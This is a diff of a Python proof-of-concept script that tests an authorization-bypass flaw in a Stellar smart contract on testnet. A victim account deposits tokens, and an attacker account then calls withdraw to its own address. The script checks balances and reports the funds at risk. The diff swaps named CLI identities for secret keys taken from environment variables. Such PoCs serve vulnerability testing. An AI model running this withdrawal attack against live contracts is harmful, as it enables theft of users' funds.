@@ -5,30 +5,30 @@ from datetime import datetime
 
 import os
 
-CONTRACT_ID = os.environ.get("CONTRACT_ID", "CBTJ2VU3VJM3WZU3TZTA6ZVGAEFRUUW6WPCIOCD7DNKL4LPLWW536ZUE")
-TOKEN_ID    = os.environ.get("TOKEN_ID", "CDLZFC3SYJYDZT7K67VZ75HPJVIEUVNIXF47ZG2FB2RMQQVU2HHGCYSC")
-VICTIM      = os.environ.get("VICTIM_ADDRESS", "GAPJOEEWW4Y5ASHLRB2XAF6LDVHN5GJQFW4VZDPRDR5JODR3ZNYBFJQD")
-ATTACKER    = os.environ.get("ATTACKER_ADDRESS", "GBLUFMJRRZBU7TYPP2KKUCTCFCKIPNYA7ELBRLXTOLOQGY3ZFT3GJA4K")
-NETWORK     = os.environ.get("STELLAR_NETWORK", "testnet")
-TEST_AMOUNT = 100
-XLM_PRICE   = 0.12
+CONTRACT_ID     = os.environ.get("CONTRACT_ID", "CBTJ2VU3VJM3WZU3TZTA6ZVGAEFRUUW6WPCIOCD7DNKL4LPLWW536ZUE")
+TOKEN_ID        = os.environ.get("TOKEN_ID", "CDLZFC3SYJYDZT7K67VZ75HPJVIEUVNIXF47ZG2FB2RMQQVU2HHGCYSC")
+VICTIM          = os.environ.get("VICTIM_ADDRESS", "GAPJOEEWW4Y5ASHLRB2XAF6LDVHN5GJQFW4VZDPRDR5JODR3ZNYBFJQD")
+ATTACKER        = os.environ.get("ATTACKER_ADDRESS", "GBLUFMJRRZBU7TYPP2KKUCTCFCKIPNYA7ELBRLXTOLOQGY3ZFT3GJA4K")
+VICTIM_SECRET   = os.environ.get("VICTIM_SECRET", "")
+ATTACKER_SECRET = os.environ.get("ATTACKER_SECRET", "")
+NETWORK         = os.environ.get("STELLAR_NETWORK", "testnet")
+TEST_AMOUNT     = 100
+XLM_PRICE       = 0.12
 # ── Helper ─────────────────────────────────────────────────
 def run(cmd):
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
     return result.stdout.strip(), result.stderr.strip(), result.returncode
 
-# ── Step 1: Deposit funds as victim ────────────────────────
 def deposit_funds():
     print(f"\n[*] Depositing {TEST_AMOUNT} XLM as victim...")
     cmd = f"""stellar contract invoke \
         --id {CONTRACT_ID} \
-        --source victim \
+        --source {VICTIM_SECRET} \
         --network {NETWORK} \
         -- deposit \
         --from {VICTIM} \
         --token {TOKEN_ID} \
         --amount {TEST_AMOUNT}"""
-    
     out, err, code = run(cmd)
     if code != 0:
         print(f"[-] Deposit failed: {err}")
@@ -36,44 +36,34 @@ def deposit_funds():
     print(f"[+] Deposit successful")
     return True
 
-# ── Step 2: Check balance before attack ────────────────────
 def get_balance():
     cmd = f"""stellar contract invoke \
         --id {CONTRACT_ID} \
-        --source victim \
+        --source {VICTIM_SECRET} \
         --network {NETWORK} \
         -- balance \
         --token {TOKEN_ID}"""
-    
     out, err, code = run(cmd)
     try:
         return int(out.replace('"', '').strip())
     except:
         return 0
 
-# ── Step 3: Simulate the attack ────────────────────────────
 def simulate_attack():
     print(f"\n[*] Simulating authorization bypass attack...")
-    print(f"[*] Attacker: {ATTACKER}")
-    print(f"[*] Target:   {CONTRACT_ID}")
-    
     cmd = f"""stellar contract invoke \
         --id {CONTRACT_ID} \
-        --source attacker \
+        --source {ATTACKER_SECRET} \
         --network {NETWORK} \
         -- withdraw \
         --to {ATTACKER} \
         --token {TOKEN_ID} \
         --amount {TEST_AMOUNT}"""
-    
     out, err, code = run(cmd)
-    
-    # Attack succeeded if exit code is 0
     if code == 0:
         return True, out
     else:
         return False, err
-
 # ── Step 4: Generate report ────────────────────────────────
 def generate_report(attack_succeeded, balance_before, balance_after):
     funds_at_risk    = balance_before - balance_after
